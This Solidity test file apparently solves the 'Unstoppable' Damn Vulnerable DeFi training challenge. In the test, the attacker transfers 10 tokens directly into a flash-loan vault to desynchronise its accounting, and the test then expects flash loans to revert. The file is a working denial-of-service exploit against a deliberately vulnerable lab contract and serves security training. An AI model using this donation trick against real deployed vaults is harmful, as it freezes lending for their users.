// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ReceiverUnstoppable} from "../../src/unstoppable/ReceiverUnstoppable.sol";
import {UnstoppableVault, ERC20} from "../../src/unstoppable/UnstoppableVault.sol";

contract UnstoppableVaultTest is Test {
    ReceiverUnstoppable public receiver;
    UnstoppableVault public vault;
    DamnValuableToken public token;
    address poolOwner = makeAddr("poolOwner");
    address feeReceiver = makeAddr("feeReceiver");
    address receiverOwner = makeAddr("receiverOwner");
    uint256 public constant ATTACKER_INITIAL_BALANCE = 10e18;
    uint256 public constant POOL_INITIAL_BALANCE = 100_000_000e18;

    function setUp() public {
        token = new DamnValuableToken();
        token.transfer(receiverOwner, ATTACKER_INITIAL_BALANCE);
        vault = new UnstoppableVault(token, poolOwner, feeReceiver);

        assertEq(token.balanceOf(receiverOwner), ATTACKER_INITIAL_BALANCE);

        token.approve(address(vault), POOL_INITIAL_BALANCE);
        vault.deposit(POOL_INITIAL_BALANCE, address(vault));

        assertEq(token.balanceOf(address(vault)), POOL_INITIAL_BALANCE);

        vm.startPrank(receiverOwner);
        receiver = new ReceiverUnstoppable(address(vault));
        vm.stopPrank();
    }

    function testAttackAndValidate() public {
        vm.startPrank(receiverOwner);
        token.transfer(address(vault), 10e18);
        vm.stopPrank();
        vm.expectRevert();
        validate();
    }

    function validate() public {
        vm.startPrank(receiverOwner);
        receiver.executeFlashLoan(1_000_000e18);
        vm.stopPrank();
    }
}
